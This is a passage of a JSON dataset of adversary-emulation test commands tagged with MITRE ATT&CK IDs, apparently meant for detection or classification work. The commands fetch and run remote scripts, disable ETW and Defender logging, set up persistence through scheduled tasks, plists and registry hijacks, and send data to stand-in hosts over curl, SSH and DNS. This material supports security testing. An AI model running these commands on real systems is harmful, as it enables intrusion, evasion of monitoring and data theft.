        "Shell": "powershell"
    },
    {
        "ID": 135,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose\n",
        "Description": "Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "powershell"
    },
    {
        "ID": 136,
        "Command": "try { get-wmiobject -class ds_computer -namespace root\\directory\\ldap -ErrorAction Stop }\ncatch { $_; exit $_.Exception.HResult }\n",
        "Description": "The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.\nUpon successful execution a listing of Systems from AD will output with their paths.\nReference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "powershell"
    },
    {
        "ID": 137,
        "Command": "net group /domain \"Domain controllers\"\n",
        "Description": "Identify remote systems with net.exe querying the Active Directory Domain Controller.\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Controller\" in the domain. Output will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "command_prompt"
    },
    {
        "ID": 138,
        "Command": "cmd /c 'PathToAtomicsFolder\\..\\ExternalPayloads\\netscan\\64-bit\\netscan.exe' /hide /auto:\"$env:temp\\T1018NetscanOutput.txt\" /range:'127.0.0.1-127.0.0.1'",
        "Description": "This test uses Netscan to identify remote hosts in a specified network range.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1018",
        "Shell": "powershell"
    },
    {
        "ID": 139,
        "Command": "echo -n 111-11-1111 | base64\ncurl -XPOST MTExLTExLTExMTE=.redcanary.com\n",
        "Description": "Utilizing a common technique for posting base64 encoded data.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1132.001",
        "Shell": "sh"
    },
    {
        "ID": 140,
        "Command": "echo -n 111-11-1111 | b64encode -r -\ncurl -XPOST MTExLTExLTExMTE=.redcanary.com\n",
        "Description": "Utilizing a common technique for posting base64 encoded data.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1132.001",
        "Shell": "sh"
    },
    {
        "ID": 141,
        "Command": "$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"Path\\n----\\nC:\\Users\\victim\"))\n$key = \"abcdefghijklmnopqrstuvwxyz123456\"\n$cyphertext =  @();\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\n}\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\n[System.Net.ServicePointManager]::Expect100Continue = $false\nInvoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive\n",
        "Description": "XOR encodes the data with a XOR key.\nReference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1132.001",
        "Shell": "powershell"
    },
    {
        "ID": 142,
        "Command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe \"PathToAtomicsFolder\\T1127.001\\src\\T1127.001.csproj\"\n",
        "Description": "Executes the code in a project file using msbuild.exe. The default C# project example file (T1127.001.csproj) will simply print \"Hello From a Code Fragment\" and \"Hello From a Class.\" to the screen.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1127.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 143,
        "Command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe \"PathToAtomicsFolder\\T1127.001\\src\\vb.xml\"\n",
        "Description": "Executes the code in a project file using msbuild.exe. The default Visual Basic example file (vb.xml) will simply print \"Hello from a Visual Basic inline task!\" to the screen.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1127.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 144,
        "Command": "sed -i '$ a #art_test_1562_006_1' /etc/audisp/audispd.conf\nif [ -f \"/etc/auditd.conf\" ];\nthen sed -i '$ a #art_test_1562_006_1' /etc/auditd.conf\nelse sed -i '$ a #art_test_1562_006_1' /etc/audit/auditd.conf\nfi \nsed -i '$ a #art_test_1562_006_1' /etc/libaudit.conf\n",
        "Description": "Emulates modification of auditd configuration files\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.006",
        "Shell": "bash"
    },
    {
        "ID": 145,
        "Command": "echo '#art_test_1562_006_1' >> /etc/security/audit_event\n",
        "Description": "Emulates modification of auditd configuration files\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.006",
        "Shell": "sh"
    },
    {
        "ID": 146,
        "Command": "if [ -f \"/etc/syslog.conf\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/syslog.conf\nfi\nif [ -f \"/etc/rsyslog.conf\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/rsyslog.conf\nfi\nif [ -f \"/etc/syslog-ng/syslog-ng.conf\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/syslog-ng.conf\nfi\n",
        "Description": "Emulates modification of syslog configuration.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.006",
        "Shell": "bash"
    },
    {
        "ID": 147,
        "Command": "if [ -f \"/etc/syslog.conf\" ];\nthen echo '#art_test_1562_006_2' >> /etc/syslog.conf\nfi\n",
        "Description": "Emulates modification of syslog configuration.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.006",
        "Shell": "sh"
    },
    {
        "ID": 148,
        "Command": "cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\pstools\\PsExec.exe\" -accepteula -i -s cmd.exe /c logman update trace \"EventLog-Application\" --p \"Microsoft-Windows-Powershell\" -ets",
        "Description": "This test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.006",
        "Shell": "powershell"
    },
    {
        "ID": 149,
        "Command": "REG ADD HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /t REG_DWORD /d 0",
        "Description": "Disables ETW for the .NET Framework using the reg.exe utility to update the Windows registry",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.006",
        "Shell": "command_prompt"
    },
    {
        "ID": 150,
        "Command": "New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \"DWord\" -Force",
        "Description": "Disables ETW for the .NET Framework using PowerShell to update the Windows registry",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.006",
        "Shell": "powershell"
    },
    {
        "ID": 151,
        "Command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /t REG_DWORD /d 0 /f\n",
        "Description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.006",
        "Shell": "command_prompt"
    },
    {
        "ID": 152,
        "Command": "New-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled  -PropertyType DWord -Value 0 -Force\n",
        "Description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.006",
        "Shell": "powershell"
    },
    {
        "ID": 153,
        "Command": "REG ADD HKCU\\Environment /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f",
        "Description": "Disables ETW for the .NET Framework by setting the COMPlus_ETWEnabled environment variable to 0 in the HKCU registry using the reg.exe utility. In order for changes to take effect a logout might be required.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.006",
        "Shell": "command_prompt"
    },
    {
        "ID": 154,
        "Command": "New-ItemProperty -Path HKCU:\\Environment -Name COMPlus_ETWEnabled -Value 0 -PropertyType \"String\" -Force",
        "Description": "Disables ETW for the .NET Framework by setting the COMPlus_ETWEnabled environment variable to 0 in the HKCU registry using PowerShell. In order for changes to take effect a logout might be required.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.006",
        "Shell": "powershell"
    },
    {
        "ID": 155,
        "Command": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f",
        "Description": "Disables ETW for the .NET Framework by setting the COMPlus_ETWEnabled environment variable to 0 in the HKLM registry using the reg.exe utility. In order for changes to take effect a reboot might be required.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.006",
        "Shell": "command_prompt"
    },
    {
        "ID": 156,
        "Command": "New-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" -Name COMPlus_ETWEnabled -Value 0 -PropertyType \"String\" -Force",
        "Description": "Disables ETW for the .NET Framework by setting the COMPlus_ETWEnabled environment variable to 0 in the HKLM registry using PowerShell. In order for changes to take effect a reboot might be required.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.006",
        "Shell": "powershell"
    },
    {
        "ID": 157,
        "Command": "which_python=`which python || which python3`\n$which_python -c \"import gzip;input_file=open('/etc/passwd', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('/tmp/passwd.gz','wb',compresslevel=6);output_file.write(content);output_file.close();\"\n",
        "Description": "Uses GZip from Python to compress files\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1560.002",
        "Shell": "sh"
    },
    {
        "ID": 158,
        "Command": "which_python=`which python || which python3`\n$which_python -c \"import bz2;input_file=open('/etc/passwd','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('/tmp/passwd.bz2','w+');output_file.write(str(bz2content));output_file.close();\"\n",
        "Description": "Uses bz2 from Python to compress files\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1560.002",
        "Shell": "sh"
    },
    {
        "ID": 159,
        "Command": "which_python=`which python || which python3`\n$which_python -c \"from zipfile import ZipFile; ZipFile('/tmp/passwd.zip', mode='w').write('/etc/passwd')\"\n",
        "Description": "Uses zipfile from Python to compress files\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1560.002",
        "Shell": "sh"
    },
    {
        "ID": 160,
        "Command": "which_python=`which python || which python3`\n$which_python -c \"import tarfile; output_file = tarfile.open('/tmp/passwd.tar.gz','w'); output_file.add('/etc/passwd'); output_file.close()\" \n",
        "Description": "Uses tarfile from Python to compress files\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1560.002",
        "Shell": "sh"
    },
    {
        "ID": 161,
        "Command": "Add-Content $profile -Value \"\"\nAdd-Content $profile -Value \"Start-Process calc.exe\"\npowershell -Command exit\n",
        "Description": "Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.013",
        "Shell": "powershell"
    },
    {
        "ID": 162,
        "Command": "if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;\nsudo cp $PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist ~/Library/LaunchAgents/com.atomicredteam.plist\nsudo launchctl load -w ~/Library/LaunchAgents/com.atomicredteam.plist\n",
        "Description": "Create a plist and execute it\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1543.001",
        "Shell": "bash"
    },
    {
        "ID": 163,
        "Command": "sudo cp $PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist /etc/emond.d/rules/atomicredteam_T1543_001.plist\nsudo touch /private/var/db/emondClients/randomflag\n",
        "Description": "This test adds persistence via a plist to execute via the macOS Event Monitor Daemon. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1543.001",
        "Shell": "bash"
    },
    {
        "ID": 164,
        "Command": "sudo cp $PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist /Library/LaunchAgents/com.atomicredteam.T1543.001.plist\nlaunchctl load -w /Library/LaunchAgents/com.atomicredteam.T1543.001.plist\n",
        "Description": "Create a plist and execute it\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1543.001",
        "Shell": "bash"
    },
    {
        "ID": 165,
        "Command": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c 'import requests;import os;url = \"https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh\";malicious_command = \"sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles\";session = requests.session();source = session.get(url).content;fd = open(\"T1059.006-payload\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'\n",
        "Description": "Download and execute shell script and write to file then execute locally using Python -c (command mode)",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.006",
        "Shell": "sh"
    },
    {
        "ID": 166,
        "Command": "which_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' > T1059.006.py\necho 'import os' >> T1059.006.py\necho 'url = \"https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh\"' >> T1059.006.py\necho 'malicious_command = \"sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles\"' >> T1059.006.py\necho 'session = requests.session()' >> T1059.006.py\necho 'source = session.get(url).content' >> T1059.006.py\necho 'fd = open(\"T1059.006-payload\", \"wb+\")' >> T1059.006.py\necho 'fd.write(source)' >> T1059.006.py\necho 'fd.close()' >> T1059.006.py\necho 'os.system(malicious_command)' >> T1059.006.py\n$which_python T1059.006.py\n",
        "Description": "Create Python file (.py) that downloads and executes shell script via executor arguments",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.006",
        "Shell": "sh"
    },
    {
        "ID": 167,
        "Command": "which_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' > T1059.006.py\necho 'import os' >> T1059.006.py\necho 'url = \"https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh\"' >> T1059.006.py\necho 'malicious_command = \"sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles\"' >> T1059.006.py\necho 'session = requests.session()' >> T1059.006.py\necho 'source = session.get(url).content' >> T1059.006.py\necho 'fd = open(\"T1059.006-payload\", \"wb+\")' >> T1059.006.py\necho 'fd.write(source)' >> T1059.006.py\necho 'fd.close()' >> T1059.006.py\necho 'os.system(malicious_command)' >> T1059.006.py\n$which_python -c 'import py_compile; py_compile.compile(\"T1059.006.py\", \"T1059.006.pyc\")'\n$which_python T1059.006.pyc\n",
        "Description": "Create Python file (.py) then compile to binary (.pyc) that downloads an external malicious script then executes locally using the supplied executor and arguments\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.006",
        "Shell": "sh"
    },
    {
        "ID": 168,
        "Command": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c \"import pty;pty.spawn('/bin/sh')\"\nexit\n$which_python -c \"import pty;pty.spawn('/bin/bash')\"\nexit",
        "Description": "Uses the Python spawn function to spawn a sh shell followed by a bash shell. Per Volexity, this technique was observed in exploitation of Atlassian Confluence [CVE-2022-26134]. Reference: https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.006",
        "Shell": "sh"
    },
    {
        "ID": 169,
        "Command": "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\nschtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"\n",
        "Description": "Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view\nthe tasks, open the Task Scheduler and look in the Active Tasks pane.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.005",
        "Shell": "command_prompt"
    },
    {
        "ID": 170,
        "Command": "SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10\n",
        "Description": "Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.005",
        "Shell": "command_prompt"
    },
    {
        "ID": 171,
        "Command": "SCHTASKS /Create /S localhost /RU DOMAIN\\user /RP At0micStrong /TN \"Atomic task\" /TR \"C:\\windows\\system32\\cmd.exe\" /SC daily /ST 20:10\n",
        "Description": "Create a task on a remote system.\nUpon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.005",
        "Shell": "command_prompt"
    },
    {
        "ID": 172,
        "Command": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTask -InputObject $object\n",
        "Description": "Create an atomic scheduled task that leverages native powershell cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.005",
        "Shell": "powershell"
    },
    {
        "ID": 173,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Scheduler\"\n",
        "Description": "This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute \"notepad.exe\" within\n30 - 40 seconds after this module has run\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.005",
        "Shell": "powershell"
    },
    {
        "ID": 174,
        "Command": "$xml = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1053.005\\src\\T1053_005_WMI.xml\")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }\n",
        "Description": "Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.005",
        "Shell": "powershell"
    },
    {
        "ID": 175,
        "Command": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f\nschtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 07:45\n",
        "Description": "A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.\nThe scheduled task will launch powershell to decode and run the command in the registry daily.\nThis is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.005",
        "Shell": "command_prompt"
    },
    {
        "ID": 176,
        "Command": "$xml = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1053.005\\src\\T1053_05_SCTASK_HIDDEN_ATTRIB.xml\")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }\n",
        "Description": "Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. \nThis technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.005",
        "Shell": "powershell"
    },
    {
        "ID": 177,
        "Command": "$Action = New-ScheduledTaskAction -Execute \"cmd.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTaskModifed -InputObject $object\n$NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\"\nSet-ScheduledTask \"AtomicTaskModifed\" -Action $NewAction\n",
        "Description": "Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. \nIt will first be created to spawn cmd.exe, but modified to run notepad.exe.\n\nUpon successful execution, powershell.exe will create a scheduled task and modify the action. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.005",
        "Shell": "powershell"
    },
    {
        "ID": 178,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\localhost -accepteula -s \"cmd.exe\"\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\localhost add lilghostie \"cmd.exe\" \"/c notepad.exe\" $env:USERDOMAIN + '\\' + $env:USERNAME logon\n",
        "Description": "Create a scheduled task through manipulation of registry keys. This procedure is implemented using the [GhostTask](https://github.com/netero1010/GhostTask) utility. By manipulating registry keys under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree, the tool creates user-specified scheduled tasks without a corresponding Windows Event 4698, which is logged when scheduled tasks are created through conventional means.\nThis requires a download of the GhostTask binary, which must be run as NT Authority\\SYSTEM. Upon successful execution of this test, a scheduled task will be set to run at logon which launches notepad.exe or runs a user-specified command.\nFor further exploration of this procedure and guidance for hunting and detection, see [Hunting G-G-G-GhostTasks!](https://medium.com/p/154b50ab6a78).\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.005",
        "Shell": "command_prompt"
    },
    {
        "ID": 179,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\calc.exe\" /f\nschtasks /Create /TN \"CompMgmtBypass\" /TR \"compmgmt.msc\" /SC ONLOGON /RL HIGHEST /F\nECHO Let's open the Computer Management console now...\ncompmgmt.msc\n",
        "Description": "Adds persistence by abusing `compmgmt.msc` via a scheduled task.\nWhen the Computer Management console is opened, it will run a malicious payload (in this case, `calc.exe`). \nThis technique abuses scheduled tasks and registry modifications to hijack legitimate system processes.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.005",
        "Shell": "command_prompt"
    },
    {
        "ID": 180,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\calc.exe\" /f\nschtasks /Create /TN \"EventViewerBypass\" /TR \"eventvwr.msc\" /SC ONLOGON /RL HIGHEST /F\nECHO Let's run the schedule task ...\nschtasks /Run /TN \"EventViewerBypass\"\n",
        "Description": "Adds persistence by abusing `eventviewer.msc` via a scheduled task.\nWhen the eventviewer console is opened, it will run a malicious payload (in this case, `calc.exe`). \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.005",
        "Shell": "command_prompt"
    },
    {
        "ID": 181,
        "Command": "export AWS_REGION=us-west-2 \ncd $PathToAtomicsFolder/T1552/src\necho \"starting warmup\"\n./stratus warmup aws.credential-access.ec2-get-password-data\necho \"starting detonate\"\n./stratus detonate aws.credential-access.ec2-get-password-data --force\n",
        "Description": "This atomic runs an API call GetPasswordData from a role that does not have permission to do so. This simulates an attacker attempting to retrieve RDP passwords on a high number of Windows EC2 instances. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ec2-get-password-data/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552",
        "Shell": "sh"
    },
    {
        "ID": 182,
        "Command": "ls -R C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt | Select-String \"password\", \"-p\", \"key\", \"pwd\", \"pass\"\n",
        "Description": "Find passwords in the powershell history files\nSearching for following strings: \"password\", \"-p\", \"key\", \"pwd\", \"pass\"\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552",
        "Shell": "powershell"
    },
    {
        "ID": 183,
        "Command": "ssh target.example.com \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n",
        "Description": "Input a domain and test Exfiltration over SSH\n\nRemote to Local\n\nUpon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1048",
        "Shell": "sh"
    },
    {
        "ID": 184,
        "Command": "tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'\n",
        "Description": "Input a domain and test Exfiltration over SSH\n\nLocal to Remote\n\nUpon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1048",
        "Shell": "sh"
    },
    {
        "ID": 185,
        "Command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1\"\nInvoke-DNSExfiltrator -i \"PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1\" -d target.example.com -p atomic -doh google -t 500 \n",
        "Description": "DNSExfiltrator enables the transfer (exfiltration) of a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.\n!!! Test will fail without a domain under your control with A record and NS record !!! \nSee this github page for more details - https://github.com/Arno0x/DNSExfiltrator\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1048",
        "Shell": "powershell"
    },
    {
        "ID": 186,
        "Command": "dig @8.8.8.8 -p 53 $(echo \"this is a secret info\" | base64).google.com\n",
        "Description": "This test demonstrates how an attacker can exfiltrate sensitive information by encoding it as a subdomain (using base64 encoding) and \nmaking DNS queries via the dig command to a controlled DNS server.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1048",
        "Shell": "bash"
    },
    {
        "ID": 187,
        "Command": "Open Microsoft Word\n\nInsert tab -> Quick Parts -> Field\n\nChoose = (Formula) and click ok.\n\nAfter that, you should see a Field inserted in the document with an error \"!Unexpected End of Formula\", right-click the Field, and choose Toggle Field Codes.\n\nThe Field Code should now be displayed, change it to Contain the following:\n\n{DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"  }\n",
        "Description": "Executes commands via DDE using Microsfot Word\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1559.002",
        "Shell": "manual"
    },
    {
        "ID": 188,
        "Command": "start \"$PathToAtomicsFolder\\T1559.002\\bin\\DDE_Document.docx\"\n",
        "Description": "When the word document opens it will prompt the user to click ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download and execute a powershell script\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1559.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 189,
